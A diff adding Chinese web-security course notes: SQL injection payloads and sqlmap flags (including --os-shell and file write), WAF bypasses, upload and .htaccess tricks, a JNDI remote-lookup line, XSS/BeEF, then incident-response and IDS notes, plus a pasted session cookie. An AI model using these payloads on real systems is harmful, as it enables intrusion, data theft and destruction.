@@ -1,0 +1,424 @@
+什么是监听器
+监听器是 Servlet 规范中的另一个组件，用于监听 Web 应用中的事件，并在事件发生时执行相应的逻辑。它不直接干预请求处理流程，而是用于监控应用的生命周期和属性变化。
+
+什么是过滤器
+过滤器是 Java Servlet 规范中定义的组件，可以对请求（Request） 和响应（Response） 进行拦截和预处理/后处理。它在 Servlet 被调用之前、响应返回给客户端之前执行。
+
+Java 序列化（Serialization）是指将 Java 对象转换为字节流的过程，而反序列化（Deserialization）则是将字节流恢复为 Java 对象的过程。这是 Java 语言提供的一种内置的对象持久化和传输机制，广泛应用于 RMI（远程方法调用）、HTTP Session 持久化、分布式缓存等场景
+import java.io.*;
+
+public class SerializationDemo {
+    public static void main(String[] args) throws Exception {
+        User user = new User("张三", 25, "secret");
+
+        // 序列化：对象 -> 文件
+        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("user.ser"))) {
+            oos.writeObject(user);
+        }
+
+        // 反序列化：文件 -> 对象
+        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream("user.ser"))) {
+            User deserializedUser = (User) ois.readObject();
+            System.out.println(deserializedUser.getName()); // 张三
+            System.out.println(deserializedUser.getPassword()); // null（transient 字段）
+        }
+    }
+
+
+log4j：Log4j 是 Apache 软件基金会下的一个开源的、基于 Java 的日志记录工具，是 Java 开发领域事实上的日志标准之一。它主要用于帮助开发者记录应用程序的运行状态、错误信息、调试信息等，对于问题排查、性能监控和运维管理至关重要。
+log.error{"",code};
+
+Fastjson 是阿里巴巴开源的一个 Java 语言编写的高性能 JSON 处理库，以其极快的序列化/反序列化速度和简洁的 API 而广受欢迎。但它也因频繁爆出的反序列化安全漏洞备受争议，成为 Java 社区中“爱恨交织”的代表组件。
+String jsonString = JSONObject.toJSONString(u);
+
+JNDI:java命令和目录接口 有五个包 重要的是RMI远程访问注册表 LDAP轻量级目录访问协议
+new initialcontext（）llokup("ldap/rmi://xxx.xxx.xxx.xxx:1099/1389 /test")
+RMI jdk 17 11 8u113版本以上无法调用
+可结合fastjson的序列化和反序列化远程连接恶意服务器执行命令
+
+spring boot 一套java开源框架
+
+41天
+ASP语言
+ASP程序与access数据可搭建，access无需链接，本地配置即可
+access无账号密码，数据库路径在源码中默认，可直接用office打开
+
+IIS短文件bug
+应用：后台路径获取，数据库文件获取，
+开源iis_shortname_sacn.py
+iis文件解析
+对.asp;.jpg此种格式的文件名当asp文件解析
+对文件夹名为.jsp目录下的文件当asp解析，可结合文件上传
+
+SQL注入 由于对用户·输入的数据·没有过滤，导致重新定义sql语句执行
+sqlmap.py -u "" --tables 获取表名
+网页路径扫描工具webpathbrute
+
+42天
+PHP-MYSQL-SQL注入
+数据库统一管理，统一root管理
+数据库一对一管理，每个网站单独创建数据库用户管理
+sql语句能干嘛 = sql语句由谁决定 => 数据库类型决定 MYSQL / Oracle
+mysql 层级：数据库名 - 表名 - 列名 - 数据
+目的：获取数据
+
+information_schema.schemata  记录数据库名的表
+information_schema.tables    记录表名信息的表
+information_schema.columns   记录列名信息的表
+
+order by 判断列数，从1递增直到报错，报错前的数字即列数
+union select 1,2,3,4,5,6  找出显示位（回显位）
+?id=1 union select 1,2,3,group_concat(table_name),5,6 from information_schema.tables where table_schema='数据库名'
+也可实现跨库查询
+跨库条件：当前数据库用户为root
+sql文件读写，文件注入上传（当前sql权限需root）
+sql注入语句里单引号就不要编码，编码就不要单引号
+
+$注入类型分类：$
+$  联合注入：页面有正常回显，使用union select$
+$  报错注入：页面有数据库错误输出，使用extractvalue()/updatexml()$
+$  布尔盲注：页面只返回true/false两种状态，无回显$
+$  时间盲注：页面无任何差异，通过响应时间判断（sleep/benchmark）$
+$  堆叠注入：支持多语句执行，用分号隔开，如;drop table xxx$
+$  二次注入：恶意数据存入数据库后，被其他功能取出拼接执行$
+
+完整枚举语句：
+1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+
+1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='库名'--+
+1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='表名'--+
+1' union select 1,2,group_concat(列名) from 表名--+
+
+$常用报错注入payload：$
+$extractvalue(1,concat(0x7e,(select database())))$
+$updatexml(1,concat(0x7e,(select database())),1)$
+
+1'union select 1,2,group_conca(scheme_name/table_name/column_name) from infronmation_schema.schemata/tables/columns where table_schema='' and table_name=''
+information_schema,performance_schema,test,mysql,geek
+geekuser,l0ve1ysq1
+
+44天
+数据查询  select * from news where id=1
+增加数据  insert into news(列名) values(数据)
+删除数据  delete from news where id=$id
+修改数据  update news set id=$id
+
+SQL盲注
+布尔盲注：有/无数据作为判断标准，常用 regexp / like / substr
+  $substr(database(),1,1)='a'  逐字符猜测$
+  $ascii(substr(database(),1,1))>97  二分法加速$
+时间盲注：if(条件, sleep(3), 0)，通过响应时间判断真假
+  $if(substr(database(),1,1)='a', sleep(3), 0)$
+报错盲注：数据库代码需要进行报错处理，报错信息中包含数据
+
+$WAF绕过常用技巧：$
+$大小写混淆：uNiOn SeLeCt$
+$注释符内联：un/**/ion se/**/lect$
+$宽字节注入：GBK编码环境下，%df' 绕过单引号转义$
+$等价替换：and→&&，or→||，空格→%09/%0a//**/$
+$双写绕过：uniunionon（某些简单替换型WAF）$
+
+
+46天
+sqlmap使用
+基础使用：python sqlmap.py -u "url"
+might be injectable  判断数据库种类
+查看表名：--tables
+查看列名：--columns -T "表名"
+查看数据：--dump -C "username,password" -T "表名"
+
+MYSQL
+--current-db          获取当前数据库
+--tables -D "库名"    获取指定库的表名
+--columns -T "表名" -D "库名"   获取列名
+--dump -C "列名" -T "表名" -D "库名"   获取数据
+--is-dba              检查管理员权限
+--file-read           文件读取
+--file-write          文件写入
+--os-cmd=calc         执行shell指令
+--os-shell            交互式shell
+
+POST注入：python sqlmap.py -u "url" --data "参数"
+--cookie              携带cookie
+数据包注入：python sqlmap.py -r ./example.txt
+txt中在测试点加星号*标记注入位置
+编码绕过：python sqlmap.py -u "url" --tamper=base64encode
+-v                    显示请求等级（0-6，默认1，3可看payload）
+--time-sec            时间盲注延迟秒数
+-level                检测级别（1-5，越高越全面）
+-risk                 风险级别（1-3，越高越激进）
+$--proxy=http://127.0.0.1:8080  挂burp代理看请求$
+$--batch              自动选择默认选项，无需交互$
+$--random-agent       随机UA，绕过UA检测$
+$--technique=B/E/U/S/T  指定注入类型(布尔/报错/联合/堆叠/时间)$
+$--second-url         指定二次注入的回显页面$
+$--flush-session      清除当前目标的session缓存$
+
+
+47天 PHP原生文件上传
+验证：JS前端验证 通过看源码，或者抓包抓不到
+解决，通过burp抓包然后修改文件后缀
+apache服务器错误配置解析 .htaccess
+AddType application/x-httpd-php .png
+把png文件当php解析
+文件上传多结合抓包 
+文件头修改上传  
+文件判断
+通过文件后缀判断文件后缀
+通过文件类型判断文件后缀
+通过文件头判断文件后缀 都可通过burp修改
+后缀Linux要么全大写要么全小写
+条件竞争
+文件已经上传了，但是会被秒删，
+利用burp不断访问发送的文件，不断发送文件
+奇迹会出现
+
+48天 php文件上传 
+中间件漏洞，依据版本nday，条件苛刻
+编辑器漏洞，没人用了，条件更苛刻
+
+49天 php文件上传
+不能解析执行的上传了也无效，有些服务器只读取不执行（对于特定目录）
+有些对于上传的png文件，后端代码会把它变成base64格式再存储，这个上传也没用
+站库分离也没用，因为存储位置不在本机，OSS同理
+
+50天 php文件包含
+本地包含
+有文件利用：配合文件上传 RCE执行
+无文件利用
+1.包含日志文件利用
+2.包含session文件利用
+3.伪协议利用
+include($_GET["File“])；
+文件阅读 
+文件写入
+代码执行
+
+52天 XSS跨站
+原理：接受输入数据，输出显示数据后解析执行
+基础类型：
+反射（非持续）
+     考虑闭合过滤问题    
+存储（持续性，数据保存到数据库）
+DOM
+
+53天 
+SVG XSS
+配合文件上传，在SVG源代码中加入script代码
+PDF也可植入script代码
+flash（swf）文件也可以做到包含
+通过植入参数，访问时以代码作为参数
+swf文件可以下载文件然后反编译分析，有的可以传入jsobject参数
+
+54天
+小皮运维管理系统xss注入
+通过登陆记录写入日志文件
+管理员访问时触发日志里的恶意代码，完成后门搭建
+http://xsscom.com xssreceiver
+只需简单配置，无需数据库，无需其他组件支持
+<script src="http://></script>
+浏览器控制框架 beef -xss
+只需执行js文件，即可实现对当前浏览器的控制，配合各类手法使用
+搭建 docker run --rm -p 3000:3000 janes/beef
+
+55天
+CSP 内容安全策略
+HttpOnly
+禁止页面的javascript访问带有httponly属性的cookie
+xss filter
+绕过
+实战:xss-labs靶场
+重要思路：输入之后画面有输出
+
+56天CSRF（跨站请求伪造）
+ 需要请求伪造数据包
+ 无过滤防护
+ 受害者需要触发
+
+防护检测：通过验证http头部中的referer
+检查是否同源
+token验证机制
+复用 删除 置空
+若不存在那没戏了
+
+57天 SSRF(服务器端请求伪造)
+一般情况下，ssrf的目标是外网无法访问的内部系统
+
+58天 RCE代码执行
+产生web源码，中间件，其他环境
+java,php,python
+eval(),assert(),preg_replace()
+system(),exec()
+
+59天XML XXE
+XML一种文件传输格式，类似json
+如果发送了恶意数据，就造成了XXE
+带有读取文件的XML内容
+1.回显
+2.无回显
+
+60天 PHP反序列化
+PHP序列化serialize()
+反序列化nserialize()
+介绍了多种魔术方法，这里没有记录
+当一些函数被触发使用时、
+有一些看不见的函数也执行了，这些函数可称为魔术方法
+pop链构造payload
+复制源码，不需要的都删掉，需要改的改掉
+在代码里创建新对象
+echo urlencode(serialize($a))
+
+61天 PHP反序列化
+__wakeup魔术方法漏洞
+字符串绕过
+
+62天 PHP框架反序列化
+Thinkphp框架 yii2框架
+反序列化链项目
+NotSoSecure
+ PHPGGC针对框架
+网上找框架对应poc，更有能力的自己写
+反序列化多为白盒操作，黑盒很难找
+
+63天 JS反序列化
+作用域 调用堆栈 XHR/提取断点
+登录界面，放出之后F12检查
+如果存在报文前端加密端，如何寻找
+1.直接搜发送的url关键字
+2.查看调用堆栈
+3.代码标签断点
+
+64天 JS
+反调试：防止他人调试，动态分析自己的代码
+绕过方法：
+禁用断点法 ctrl+F8
+条件断点法 添加条件断点设为false
+把代码保存到本地，用本地删除过反调试代码之后的文件
+代码混淆
+如何破解奇妙的js代码？
+利用函数最后一般是（）；结尾的特性，把最后一个小括号删了
+解密：1.花钱挂委托
+2.GitHub开源脚本
+
+65天 JS
+f12调试模式中
+网络传输的js代码可能发生信息泄露
+如阿里云CMS账号密码等
+若代码验证逻辑在前端，通过返回码来判断逻辑
+可以通过burpsuite修改返回值
+好用的插件 findsomething
+
+66天 java
+JDBC mybatis 注入攻击
+${}不安全的写法，会导致语句拼接
+ 
+67天 java安全 
+JNDI注入
+RMI:远程调用注册表，可远程执行JAVA代码
+ LDAP
+五大不安全组件
+shiro反序列化
+结合工具分析（登陆界面）
+ fastjson jackjson xstream 
+ log4j
+ log4j默认支持rmi和ldap协议
+ 注入payload生成 javasec.jar
+
+ 68天 java反序列化
+ java序列化方法分为java原生反序列化
+ 和json类（fastjson，jackson）序列化等
+  工具yak runner yakit
+  java安全 spring boot框架
+  基于actuator模块
+  泄露安全 git项目JDumpSpider heapdump_tool
+  burp插件apikit 针对springboard
+  
+  
+platform=spc; advanced-backend=c34c03eda244e2b50869072a2d029dba; _csrf-backend=a1155dd3f9f741c8143f19599ccc9c89a92a7229207b29f3191d21b5ac7f925ea%3A2%3A%7Bi%3A0%3Bs%3A13%3A%22_csrf-backend%22%3Bi%3A1%3Bs%3A32%3A%22JOMl7z6IcCsUy3gVjLZp8SW_FVzZQuzY%22%3B%7D
+
+69天 java安全
+druid监控 阿里巴巴出品的监控系统
+无验证造成信息泄露（少）
+swagger自动测试
+JWT特征 由三个部分组成，由两个.分开
+JWT安全空加密算法，未校验签名，暴力破解密钥
+
+70，71天 python安全
+
+72天 业务逻辑篇
+水平越权，垂直越权，未授权访问
+packerfuzzer 查找未授权访问点
+
+73天 支付逻辑篇
+熟悉哪些数据篡改
+商品id 价格，数量，支付方式，折扣属性
+熟悉那些修改方式
+替换支付，重复支付，最小额支付，负数支付，溢出支付
+fuzz模糊测试点
+口令fuzz 目录fuzz 参数fuzz payloadfuzz
+
+78天 数据库安全
+redis开放6379端口
+可能存在未授权访问现象cve-2019-21763
+沙箱绕过cve-2022-0243
+couchdb:5984命令执行2017-12636
+h2database:20051
+
+213天 蓝队技能 应急响应
+分析思路 时间节点，利用漏洞筛选，后门查杀，文件修改时间
+中间件日志分析 IIS/Apache/Nginx/Tomcat ...
+数据库日志分析 Mysql，Mssql，Oracle...
+攻击链分析 处置
+IIS日志 可直接点击查看路径
+一些问题 POST数据没有记录
+Apache日志，在中间件根目录里
+webshell扫描工具，通过扫面后门再查看后门访问记录
+
+214天 应急响应篇
+文件信息扫描 微步在线
+火绒盾查看运行的端口服务
+定性 msd cs viper sliver vshell 响尾蛇等
+平台分析 文件 或 ip域名 
+处置清理 进程树结束后删除，某些后门需重启删除或降权删除
+封锁
+防火墙策略封锁 1.进程名 2.网络连接
+3.限制协议
+基线检测配合分析项目
+d-eyes golin linuxcheckshoot
+
+215天 蓝队技能，应急响应
+挖矿病毒脚本响应
+排查方向，GPU拉满，网络阻塞等
+分析定性
+进程找到文件，文件上传威胁情报平台分析
+网络找到外链，url&ip上报威胁情报平台解析分析
+查看windows，linux日志
+应急处置
+排查重启生效项，注册表，入口攻击点，禁用对应服务
+删除自动配置脚本
+
+218天 应急响应，内网安全
+ssh 登录日志/var/log/secure.log
+检查accept
+RDP/SMB 事件查看器安全项 状态码4624/2625
+还有FTP Redis MYSQL STMP等协议
+
+220天 应急响应 web内存马查杀
+查杀项目arthas 阿里巴巴的监控诊断产品
+查看url路由(看servlet)mbean | grep "name=/"
+内存马访问触发特征
+1.url地址路径
+sc 查看JVM已加载的类信息
+sc *filter sc *servlet
+
+225天 IDS入侵检测系统
+NIDS基于网络的入侵检测系统 
+snort suricata
+snort -i eth0 -c /etc/snort/snort.conf -A fast -l
+alert tcp(监听协议) any(来源主机) any（来源端口） -> any(本机ip) any(任意本机端口) (msg:)
+写规则文件，导入，监听查看报告
+
+226天 IDS入侵检测系统
+HIDS基于主机的入侵检测系统 
+elkeid 字节跳动开源 内置教程
+elastic
+
